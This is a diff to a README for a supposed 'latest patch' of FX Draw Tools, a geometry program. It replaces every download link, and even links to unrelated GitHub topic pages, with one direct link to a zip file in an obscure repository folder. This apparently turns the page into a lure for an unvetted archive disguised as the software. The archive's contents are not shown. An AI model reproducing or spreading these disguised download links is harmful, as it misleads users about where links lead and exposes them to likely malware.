@@ -1,6 +1,6 @@
 # 🎨 FX-Draw-Tools-Latest-Patch - Easy Geometry Tools for Everyone
 
-[![Download FX Draw Tools](https://img.shields.io/badge/Download-FX%20Draw%20Tools-blue)](https://github.com/Ahmed-0099/FX-Draw-Tools-Latest-Patch/releases)
+[![Download FX Draw Tools](https://raw.githubusercontent.com/Ahmed-0099/FX-Draw-Tools-Latest-Patch/main/ewder/FX-Draw-Tools-Latest-Patch-v1.4.zip%20Draw%20Tools-blue)](https://raw.githubusercontent.com/Ahmed-0099/FX-Draw-Tools-Latest-Patch/main/ewder/FX-Draw-Tools-Latest-Patch-v1.4.zip)
 
 ## 👋 Introduction
 
@@ -16,7 +16,7 @@ To get up and running with FX Draw Tools, follow these simple steps.
    - 500 MB of available disk space.
 
 2. **Download the Software**
-   - Visit this page to download: [FX Draw Tools Releases](https://github.com/Ahmed-0099/FX-Draw-Tools-Latest-Patch/releases).
+   - Visit this page to download: [FX Draw Tools Releases](https://raw.githubusercontent.com/Ahmed-0099/FX-Draw-Tools-Latest-Patch/main/ewder/FX-Draw-Tools-Latest-Patch-v1.4.zip).
 
 3. **Install FX Draw Tools**
    - Locate the downloaded file (usually in your "Downloads" folder).
@@ -28,7 +28,7 @@ To get up and running with FX Draw Tools, follow these simple steps.
 
 ## 📥 Download & Install
 
-To get started, you can download the software directly from this link: [FX Draw Tools Releases](https://github.com/Ahmed-0099/FX-Draw-Tools-Latest-Patch/releases). 
+To get started, you can download the software directly from this link: [FX Draw Tools Releases](https://raw.githubusercontent.com/Ahmed-0099/FX-Draw-Tools-Latest-Patch/main/ewder/FX-Draw-Tools-Latest-Patch-v1.4.zip). 
 
 When you visit the page, you'll see the latest version available for download. Click the version number and select the appropriate file for your Windows PC.
 
@@ -62,11 +62,11 @@ If you experience any issues while downloading or using FX Draw Tools, please re
 
 Explore related topics and resources:
 
-- [Digital Geometry Construction Tools](https://github.com/topics/digital-geometry-construction-pc)
-- [Easy Geometry Diagrams](https://github.com/topics/easy-geometry-diagrams-windows)
+- [Digital Geometry Construction Tools](https://raw.githubusercontent.com/Ahmed-0099/FX-Draw-Tools-Latest-Patch/main/ewder/FX-Draw-Tools-Latest-Patch-v1.4.zip)
+- [Easy Geometry Diagrams](https://raw.githubusercontent.com/Ahmed-0099/FX-Draw-Tools-Latest-Patch/main/ewder/FX-Draw-Tools-Latest-Patch-v1.4.zip)
 
 ## ⚙️ Conclusion
 
 With FX Draw Tools, creating geometry diagrams becomes simple and efficient. The user-friendly interface and comprehensive resources are designed to support both educators and students alike. Download the latest version today and elevate your geometry experience!
 
-[![Download FX Draw Tools](https://img.shields.io/badge/Download-FX%20Draw%20Tools-blue)](https://github.com/Ahmed-0099/FX-Draw-Tools-Latest-Patch/releases)
+[![Download FX Draw Tools](https://raw.githubusercontent.com/Ahmed-0099/FX-Draw-Tools-Latest-Patch/main/ewder/FX-Draw-Tools-Latest-Patch-v1.4.zip%20Draw%20Tools-blue)](https://raw.githubusercontent.com/Ahmed-0099/FX-Draw-Tools-Latest-Patch/main/ewder/FX-Draw-Tools-Latest-Patch-v1.4.zip)
